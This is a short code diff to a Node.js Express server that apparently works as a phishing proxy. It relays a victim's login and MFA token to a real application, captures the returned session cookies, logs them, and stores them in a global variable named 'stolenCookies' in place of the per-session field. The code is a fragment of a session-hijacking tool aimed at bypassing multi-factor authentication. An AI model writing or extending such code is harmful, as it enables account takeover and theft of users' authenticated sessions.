@@ -1,3 +1,5 @@
+let stolenCookies = null;
+
 const express = require('express');
 const axios = require('axios');
 
@@ -71,8 +73,7 @@ app.post('/login', async (req, res) => {
     
     const cookies =
       response.headers['set-cookie'];
-    req.session.realAppCookies =
-      cookies;
+    stolenCookies = cookies;
     
     console.log(cookies);
 
@@ -120,7 +121,7 @@ app.post('/mfa', async (req, res) => {
   const { token } = req.body;
 
   const cookies =
-    req.session.realAppCookies;
+    stolenCookies;
 
   try {
 
@@ -178,7 +179,7 @@ app.get(
   async (req, res) => {
 
     const cookies =
-      req.session.realAppCookies;
+      stolenCookies;
 
     if (!cookies) {
 
